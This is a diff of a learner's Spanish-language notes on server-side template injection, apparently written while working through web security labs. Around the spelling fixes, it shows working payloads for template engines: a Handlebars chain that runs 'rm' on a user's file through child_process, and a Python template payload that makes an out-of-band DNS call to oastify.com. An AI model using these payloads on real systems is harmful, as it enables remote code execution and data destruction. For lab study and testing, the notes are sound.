@@ -1,5 +1,3 @@
-
-payloads all the things = GOAT
 ## ERB (ruby)
 
 ```
@@ -15,7 +13,7 @@ payloads all the things = GOAT
 {%import os%}{{os.system('nslookup oastify.com')}}
 ```
 
-en este lab podias cambiar tu nick y se veia reflejado en los comentarios que ponías
+en este lab podías cambiar tu nick y se veía reflejado en los comentarios que ponías
 
 
 ## Handlebars
@@ -24,7 +22,7 @@ en este lab podias cambiar tu nick y se veia reflejado en los comentarios que po
 wrtz{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}
 ```
 
-acuerda de si está en una url hay que encodearlo
+recordar que si está en una url hay que encodearlo
 
 ## Django secret key
 
